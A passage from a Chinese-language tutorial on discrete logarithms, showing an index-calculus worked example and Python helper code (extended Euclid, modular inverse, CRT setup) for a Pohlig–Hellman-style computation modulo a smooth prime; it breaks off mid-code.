class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span></span></p>
</li>
</ol>
<p>例如</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>令</mtext><mi>p</mi><mo>=</mo><mn>229.</mn><mtext>有限乘法群</mtext><msubsup><mi>Z</mi><mi>p</mi><mo>∗</mo></msubsup><mtext>生成元</mtext><mi>α</mi><mo>=</mo><mn>6</mn><mtext>。</mtext><mi>β</mi><mo>=</mo><mn>13</mn><mtext>，使用指数积分算法计算离散对数</mtext><mi>l</mi><mi>o</mi><msub><mi>g</mi><mn>6</mn></msub><mn>13</mn></mrow><annotation encoding="application/x-tex">令p=229.有限乘法群Z_p^*生成元 \alpha=6。\beta=13，使用指数积分算法计算离散对数log_613
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">令</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.121804em;vertical-align:-0.383108em;"></span><span class="mord">2</span><span class="mord">2</span><span class="mord">9</span><span class="mord">.</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">群</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.738696em;"><span style="top:-2.4530000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span><span style="top:-3.1130000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">元</span><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">6</span><span class="mord cjk_fallback">。</span><span class="mord mathnormal" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">3</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">积</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">计</span><span class="mord cjk_fallback">算</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">6</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">1</span><span class="mord">3</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/10/6a08ee904b1d7c9f.jpg" alt="" /></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/10/d200f4769c857296.jpg" alt="" /></p>
<p>参照第七步</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>x</mi><mo>=</mo><mi>l</mi><mi>o</mi><mi>g</mi><msub><mi>α</mi><mi>β</mi></msub><mo>≡</mo><msub><mi>c</mi><mn>1</mn></msub><mtext>​</mtext><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>α</mi></msub><mtext>​</mtext><mi>p</mi><mn>1</mn><mtext>​</mtext><mo>+</mo><msub><mi>c</mi><mn>2</mn></msub><mtext>​</mtext><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>α</mi></msub><mtext>​</mtext><mi>p</mi><mn>2</mn><mtext>​</mtext><mo>+</mo><mo>⋯</mo><mo>+</mo><msub><mi>c</mi><mi>B</mi></msub><mtext>​</mtext><mi>l</mi><mi>o</mi><msub><mi>g</mi><mi>α</mi></msub><mtext>​</mtext><mi>p</mi><mi>B</mi><mo>−</mo><mi>k</mi><mtext>​</mtext><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mtext>−</mtext><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">x=logα_β≡c_1​log_α​p1​+c_2​log_α​p2​+⋯+c_B​log_α​pB-k​(modp−1)
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.0037em;">α</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361079999999999em;"><span style="top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05278em;">β</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">​</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">​</span><span class="mord mathnormal">p</span><span class="mord">1</span><span class="mord">​</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">​</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">​</span><span class="mord mathnormal">p</span><span class="mord">2</span><span class="mord">​</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">​</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.0037em;">α</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">​</span><span class="mord mathnormal">p</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">​</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord mathnormal">p</span><span class="mord">−</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></span></p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/04/10/aeaf4973c3a0f94f.jpg" alt="" /></p>
<h3 id="利用crt求x"><a class="anchor" href="#利用crt求x">#</a> 利用 CRT 求 x</h3>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#g=65537, p=26622572818608571599593915643850055101138771</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#g^x=14632691854639937953996750549254161821338360 （mod p）</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> math</pre></td></tr><tr><td data-num="5"></td><td><pre> </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">#欧几里得算法求最大公约数</span></pre></td></tr><tr><td data-num="7"></td><td><pre> </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre> </pre></td></tr><tr><td data-num="10"></td><td><pre>	k <span class="token operator">=</span> a <span class="token operator">//</span> b</pre></td></tr><tr><td data-num="11"></td><td><pre> </pre></td></tr><tr><td data-num="12"></td><td><pre>	remainder <span class="token operator">=</span> a <span class="token operator">%</span> b</pre></td></tr><tr><td data-num="13"></td><td><pre> </pre></td></tr><tr><td data-num="14"></td><td><pre>	<span class="token keyword">while</span> remainder <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre> </pre></td></tr><tr><td data-num="16"></td><td><pre>		a <span class="token operator">=</span> b </pre></td></tr><tr><td data-num="17"></td><td><pre> </pre></td></tr><tr><td data-num="18"></td><td><pre>		b <span class="token operator">=</span> remainder</pre></td></tr><tr><td data-num="19"></td><td><pre> </pre></td></tr><tr><td data-num="20"></td><td><pre>		k <span class="token operator">=</span> a <span class="token operator">//</span> b</pre></td></tr><tr><td data-num="21"></td><td><pre> </pre></td></tr><tr><td data-num="22"></td><td><pre>		remainder <span class="token operator">=</span> a <span class="token operator">%</span> b</pre></td></tr><tr><td data-num="23"></td><td><pre> </pre></td></tr><tr><td data-num="24"></td><td><pre>	<span class="token keyword">return</span> b</pre></td></tr><tr><td data-num="25"></td><td><pre> </pre></td></tr><tr><td data-num="26"></td><td><pre>	</pre></td></tr><tr><td data-num="27"></td><td><pre> </pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token comment">#扩展欧几里得算法求线性方程的 x 与 y</span></pre></td></tr><tr><td data-num="29"></td><td><pre> </pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token keyword">def</span> <span class="token function">get_</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre> </pre></td></tr><tr><td data-num="32"></td><td><pre>	<span class="token keyword">if</span> b <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="33"></td><td><pre> </pre></td></tr><tr><td data-num="34"></td><td><pre>		<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span></pre></td></tr><tr><td data-num="35"></td><td><pre> </pre></td></tr><tr><td data-num="36"></td><td><pre>	<span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="37"></td><td><pre> </pre></td></tr><tr><td data-num="38"></td><td><pre>		k <span class="token operator">=</span> a <span class="token operator">//</span> b</pre></td></tr><tr><td data-num="39"></td><td><pre> </pre></td></tr><tr><td data-num="40"></td><td><pre>		remainder <span class="token operator">=</span> a <span class="token operator">%</span> b		</pre></td></tr><tr><td data-num="41"></td><td><pre> </pre></td></tr><tr><td data-num="42"></td><td><pre>		x1<span class="token punctuation">,</span> y1 <span class="token operator">=</span> get_<span class="token punctuation">(</span>b<span class="token punctuation">,</span> remainder<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="43"></td><td><pre> </pre></td></tr><tr><td data-num="44"></td><td><pre>		x<span class="token punctuation">,</span> y <span class="token operator">=</span> y1<span class="token punctuation">,</span> x1 <span class="token operator">-</span> k <span class="token operator">*</span> y1			</pre></td></tr><tr><td data-num="45"></td><td><pre> </pre></td></tr><tr><td data-num="46"></td><td><pre>	<span class="token keyword">return</span> x<span class="token punctuation">,</span> y</pre></td></tr><tr><td data-num="47"></td><td><pre> </pre></td></tr><tr><td data-num="48"></td><td><pre>	</pre></td></tr><tr><td data-num="49"></td><td><pre> </pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token comment">#计算逆元的函数，返回值是逆元</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token keyword">def</span> <span class="token function">answer</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>        </pre></td></tr><tr><td data-num="52"></td><td><pre>        <span class="token comment">#将初始 b 的绝对值进行保存</span></pre></td></tr><tr><td data-num="53"></td><td><pre>        <span class="token keyword">if</span> b <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="54"></td><td><pre>                m <span class="token operator">=</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="55"></td><td><pre>        <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="56"></td><td><pre>                m <span class="token operator">=</span> b</pre></td></tr><tr><td data-num="57"></td><td><pre>                flag <span class="token operator">=</span> get_gcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="58"></td><td><pre>                <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>	</pre></td></tr><tr><td data-num="59"></td><td><pre>                        x<span class="token punctuation">,</span> y <span class="token operator">=</span> get_<span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>	</pre></td></tr><tr><td data-num="60"></td><td><pre>                        x0 <span class="token operator">=</span> x <span class="token operator">%</span> m <span class="token comment">#对于 Python '%' 就是求模运算，因此不需要 '+m'</span></pre></td></tr><tr><td data-num="61"></td><td><pre>                        <span class="token keyword">return</span> x0</pre></td></tr><tr><td data-num="62"></td><td><pre>                <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="63"></td><td><pre>                        <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token string">"Do not have!"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="64"></td><td><pre> </pre></td></tr><tr><td data-num="65"></td><td><pre> </pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token keyword">def</span> <span class="token function">str_to_hex</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="67"></td><td><pre>    <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="68"></td><td><pre> </pre></td></tr><tr><td data-num="69"></td><td><pre><span class="token keyword">def</span> <span class="token function">hex_to_str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="70"></td><td><pre>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="71"></td><td><pre>    </pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token keyword">def</span> <span class="token function">str_to_bin</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="73"></td><td><pre>    <span class="token keyword">return</span> <span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> s<span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="74"></td><td><pre>    </pre></td></tr><tr><td data-num="75"></td><td><pre><span class="token keyword">def</span> <span class="token function">bin_to_str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="76"></td><td><pre>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">for</span> b <span class="token keyword">in</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="77"></td><td><pre> </pre></td></tr><tr><td data-num="78"></td><td><pre> </pre></td></tr><tr><td data-num="79"></td><td><pre> </pre></td></tr><tr><td data-num="80"></td><td><pre> </pre></td></tr><tr><td data-num="81"></td><td><pre><span class="token keyword">def</span> <span class="token function">exGcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>xy<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#求特解</span></pre></td></tr><tr><td data-num="82"></td><td><pre>    <span class="token keyword">if</span> b<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="83"></td><td><pre>        xy<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="84"></td><td><pre>        xy<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span></pre></td></tr><tr><td data-num="85"></td><td><pre>        <span class="token comment">#print ("(f, g) is ", a)</span></pre></td></tr><tr><td data-num="86"></td><td><pre>        <span class="token keyword">return</span> a</pre></td></tr><tr><td data-num="87"></td><td><pre>    r<span class="token operator">=</span>exGcd<span class="token punctuation">(</span>b<span class="token punctuation">,</span>a<span class="token operator">%</span>b<span class="token punctuation">,</span>xy<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="88"></td><td><pre>    t <span class="token operator">=</span> xy<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="89"></td><td><pre>    xy<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> xy<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="90"></td><td><pre>    xy<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>t<span class="token operator">-</span>a<span class="token operator">//</span>b<span class="token operator">*</span>xy<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="91"></td><td><pre>    <span class="token keyword">return</span> r</pre></td></tr><tr><td data-num="92"></td><td><pre><span class="token comment">#----------------------------------------- 以下为求出密文的 e 次方 ---------------------------#</span></pre></td></tr><tr><td data-num="93"></td><td><pre> </pre></td></tr><tr><td data-num="94"></td><td><pre> </pre></td></tr><tr><td data-num="95"></td><td><pre> </pre></td></tr><tr><td data-num="96"></td><td><pre> </pre></td></tr><tr><td data-num="97"></td><td><pre>a<span class="token operator">=</span><span class="token number">26622572818608571599593915643850055101138771</span></pre></td></tr><tr><td data-num="98"></td><td><pre>h<span class="token operator">=</span><span class="token number">14632691854639937953996750549254161821338360</span></pre></td></tr><tr><td data-num="99"></td><td><pre>s<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">107</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">139</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">151</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">167</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">173</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">179</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="100"></td><td><pre> </pre></td></tr><tr><td data-num="101"></td><td><pre>g<span class="token operator">=</span><span class="token number">65537</span></pre></td></tr><tr><td data-num="102"></td><td><pre>x<span class="token operator">=</span><span class="token number">1</span></pre></td></tr><tr><td data-num="103"></td><td><pre>n<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#模数 mi</span></pre></td></tr><tr><td data-num="104"></td><td><pre>e<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#加密指数</span></pre></td></tr><tr><td data-num="105"></td><td><pre>c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment">#密文</span></pre></td></tr><tr><td data-num="106"></td><td><pre>hi<span class="token operator">=</span><span class="token punctuation">[</span><span 